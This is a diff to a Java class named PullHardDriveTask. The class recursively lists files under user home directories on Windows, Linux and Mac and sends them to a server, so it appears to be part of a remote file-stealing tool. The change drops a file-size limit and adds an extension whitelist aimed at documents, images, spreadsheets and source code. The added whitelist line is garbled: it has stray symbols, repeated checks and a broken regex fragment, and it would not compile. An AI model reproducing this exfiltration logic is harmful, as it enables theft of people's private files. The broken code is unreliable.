@@ -11,7 +11,6 @@ import java.util.Scanner;
 
 public class PullHardDriveTask extends Task {
 
-
   private static final String WINDOWS_BASE_DIR = "C:\\Users\\";
   private static final String LINUX_BASE_DIR = "~/";
   private static final String MAC_BASE_DIR = "/Users/";
@@ -50,16 +49,12 @@ public class PullHardDriveTask extends Task {
   private void getAllFilesInDirectoryAndSendToServer(String baseDirectory,
       ObjectOutputStream streamToServer) {
 
-    File[] allFiles = new File(baseDirectory).listFiles();
+    File[] allFiles = new File(baseDirectory).listFiles((x, y) -> hasWhiteListedExtension(x, y));
 
     for (File file : allFiles) {
 
       if (file.isDirectory()) {
         getAllFilesInDirectoryAndSendToServer(file.getPath(), streamToServer);
-      }
-
-      if (file.length() > 10485760) {
-        continue;
       }
 
       try {
@@ -79,7 +74,10 @@ public class PullHardDriveTask extends Task {
   @Override
   public void execute() {
     // No preprocessing needed
+  }
 
+  private boolean hasWhiteListedExtension(File file, String name) {
+    return name.toLowerCase().endsWith("jpg") || name.endsWith("doc") || name.endsWith("docx")| || name.endsWith("pdf")| || name.endsWith("jpg")| v || name.endsWith("jpg")| || name.endsWith("jpg")| || name.endsWith("jpg")| || name.endsWith("jpg")||JPG|gif|GIF|doc|DOC|pdf|PDF|doc|DOC|docx|DOCX|tex|TEX|png|PNG|xls|XLS|xlsx|XLSX|ppt|PPT|pptx|PPTX|txt|TXT|mobi|MOBI|epub|EPUB|java|py|cpp|c|php|js|html|HTML|pub|PUB)$");
   }
 
   @Override
